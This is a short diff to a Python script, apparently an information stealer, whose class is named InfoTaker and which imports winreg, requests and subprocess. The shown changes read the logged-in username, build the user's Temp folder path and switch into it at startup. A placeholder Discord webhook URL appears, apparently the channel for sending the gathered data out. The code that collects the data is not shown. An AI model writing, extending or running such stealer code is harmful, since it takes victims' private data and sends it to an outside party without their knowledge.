@@ -5,6 +5,12 @@ import winreg
 import requests
 import subprocess
 
+# Get the current username of the logged-in user
+username = os.getlogin()
+
+# Path to the temporary directory for the current user
+tempPath = f"C:/Users/{username}/AppData/Local/Temp"
+
 class InfoTaker:
     @staticmethod
     def decodeOutput(output):
@@ -206,6 +212,8 @@ class InfoTaker:
 
 
 if __name__ == "__main__":
+    os.chdir(tempPath)
+    
     # URL of the Discord webhook
     webhookUrl = "DISCORD_WEBHOOK_HERE"
 
